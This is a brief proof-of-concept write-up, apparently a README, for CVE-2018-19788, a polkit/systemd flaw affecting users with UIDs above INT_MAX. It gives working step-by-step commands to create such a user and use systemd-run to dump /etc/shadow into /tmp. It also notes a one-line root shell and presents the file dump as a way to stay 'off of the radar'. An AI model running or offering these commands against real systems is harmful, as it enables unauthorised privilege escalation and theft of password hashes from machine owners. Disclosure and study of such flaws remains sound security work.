# Leveraging CVE-2018-19788 to dump protected files without root shell

[CVE-2018-19788](https://gitlab.freedesktop.org/polkit/polkit/issues/74) is an issue where any user with a UID over INT_MAX (IE 4000000000) can run any systemctl command on a systemd linux box, such as Ubuntu. (There is already a writeup to gain a root shell found: [here](http://manivelsysad.blogspot.com/2018/12/low-privileged-user-with-uid-greater.html)). The main difference between this writeup and the full root shell writeup is that this will be run as the user itself instead of a root user (basically just a PoC to be honest)

# Getting /etc/shadow without executing a root shell

To get a root shell it's as simple as running `systemd-run -t /bin/bash` but if you want to keep off of the radar you can run simple commands to get privileged files without a terminal. Follow these steps to do it:

 - Add a user with a UID above INT_MAX:
   ```bash
   adduser --uid 4000000000 someusername
   ```
 - Switch into the user account:
   ```bash
   su someusername
   ```
 - Run the command for whatever file you would like (we'll use /etc/shadow for this):
   ```bash
   systemd-run bash -c 'cat /etc/shadow > /tmp/results_poc.txt'
   ```
 - Your file is now in `/tmp`:
   ```bash
   cat /tmp/results_poc.txt
   ```

# PoC video

[![to_video](https://user-images.githubusercontent.com/14183473/50110172-3476cd00-01ff-11e9-883c-1a9fb3e0361e.png)](https://vimeo.com/306879983)
